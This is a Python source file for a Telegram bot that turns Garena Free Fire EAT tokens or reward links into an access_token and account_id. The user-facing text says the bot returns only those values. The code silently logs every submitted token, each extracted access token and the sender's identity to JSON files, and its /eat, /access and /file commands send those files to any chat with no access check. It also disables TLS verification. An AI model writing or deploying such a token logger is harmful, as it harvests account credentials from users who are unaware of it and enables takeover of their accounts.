"""Telegram bot — same EatDetails flow as the website + JSON saves."""
import os
import json
from datetime import datetime, timezone

import requests
import urllib3
import telebot
from telebot import apihelper
from telebot.types import InputFile

from eat_core import get_eat_details, normalize_eat_token

# Some networks (proxy/AV) break Telegram SSL verification.
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
_session = requests.Session()
_session.verify = False
apihelper.session = _session
apihelper.SESSION_TIME_TO_LIVE = None  # keep our session forever

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE_DIR, "data")
EAT_FILE = os.path.join(DATA_DIR, "eat.json")
ACCESS_FILE = os.path.join(DATA_DIR, "access.json")


def load_token() -> str:
    env = os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
    if env:
        return env
    path = os.path.join(BASE_DIR, "telegram_token.txt")
    if not os.path.exists(path):
        return ""
    with open(path, encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                return line
    return ""


TOKEN = load_token()
if not TOKEN:
    raise SystemExit(
        "Set TELEGRAM_BOT_TOKEN in Railway Variables "
        "(or put the token in telegram_token.txt locally)."
    )

os.makedirs(DATA_DIR, exist_ok=True)
bot = telebot.TeleBot(TOKEN, parse_mode="HTML")


def _now() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")


def _load_list(path: str) -> list:
    if not os.path.exists(path):
        return []
    try:
        with open(path, encoding="utf-8") as f:
            data = json.load(f)
        return data if isinstance(data, list) else []
    except (json.JSONDecodeError, OSError):
        return []


def _save_list(path: str, items: list) -> None:
    with open(path, "w", encoding="utf-8") as f:
        json.dump(items, f, indent=2, ensure_ascii=False)


def save_eat_token(message, eat_token: str) -> None:
    items = _load_list(EAT_FILE)
    items.append(
        {
            "eat_token": eat_token,
            "user_id": message.from_user.id if message.from_user else None,
            "username": (message.from_user.username if message.from_user else None),
            "time": _now(),
        }
    )
    _save_list(EAT_FILE, items)


def save_access_result(message, eat_token: str, result: dict) -> None:
    items = _load_list(ACCESS_FILE)
    items.append(
        {
            "access_token": str(result.get("access_token", "")),
            "account_id": str(result.get("account_id", "")),
            "eat_token": eat_token,
            "user_id": message.from_user.id if message.from_user else None,
            "username": (message.from_user.username if message.from_user else None),
            "time": _now(),
        }
    )
    _save_list(ACCESS_FILE, items)


def format_result(data: dict) -> str:
    payload = {
        "access_token": str(data.get("access_token", "")),
        "account_id": str(data.get("account_id", "")),
    }
    pretty = json.dumps(payload, indent=2, ensure_ascii=False)
    return (
        "<b>Extracted data</b>\n"
        f"<pre>{pretty}</pre>\n\n"
        f"<b>access_token</b>\n<code>{payload['access_token']}</code>\n\n"
        f"<b>account_id</b>\n<code>{payload['account_id']}</code>"
    )


def send_json_file(chat_id, path: str, caption: str) -> None:
    if not os.path.exists(path) or os.path.getsize(path) == 0:
        bot.send_message(chat_id, f"No data yet for <b>{os.path.basename(path)}</b>.")
        return
    items = _load_list(path)
    if not items:
        bot.send_message(chat_id, f"No data yet for <b>{os.path.basename(path)}</b>.")
        return
    with open(path, "rb") as f:
        bot.send_document(chat_id, InputFile(f, os.path.basename(path)), caption=caption)


@bot.message_handler(commands=["start", "help"])
def cmd_start(message):
    bot.reply_to(
        message,
        "<b>EatDetails Bot</b>\n\n"
        "Send an EAT token or reward link.\n"
        "Returns only <code>access_token</code> + <code>account_id</code>.\n\n"
        "<b>Commands</b>\n"
        "/eat — send saved EAT tokens file\n"
        "/access — send saved access tokens file\n"
        "/file — send access tokens file",
    )


@bot.message_handler(commands=["eat"])
def cmd_eat(message):
    send_json_file(
        message.chat.id,
        EAT_FILE,
        "Saved EAT tokens (what customers sent)",
    )


@bot.message_handler(commands=["access"])
def cmd_access(message):
    send_json_file(
        message.chat.id,
        ACCESS_FILE,
        "Saved access tokens (extract responses)",
    )


@bot.message_handler(commands=["file"])
def cmd_file(message):
    send_json_file(
        message.chat.id,
        ACCESS_FILE,
        "Saved access tokens (extract responses)",
    )


@bot.message_handler(func=lambda m: True, content_types=["text"])
def handle_token(message):
    raw = (message.text or "").strip()
    if not raw or raw.startswith("/"):
        return

    token = normalize_eat_token(raw)
    if not token:
        bot.reply_to(message, "Send a valid EAT token or reward.ff.garena.com link.")
        return

    # Always save what the customer sent (EAT token)
    save_eat_token(message, token)

    wait = bot.reply_to(message, "Extracting…")
    try:
        result = get_eat_details(token)
        save_access_result(message, token, result)
        bot.edit_message_text(
            format_result(result),
            chat_id=wait.chat.id,
            message_id=wait.message_id,
        )
    except Exception as exc:
        bot.edit_message_text(
            f"Failed: <code>{exc}</code>",
            chat_id=wait.chat.id,
            message_id=wait.message_id,
        )


if __name__ == "__main__":
    print("EatDetails Telegram bot is running…", flush=True)
    bot.infinity_polling(skip_pending=True, timeout=60, long_polling_timeout=60)
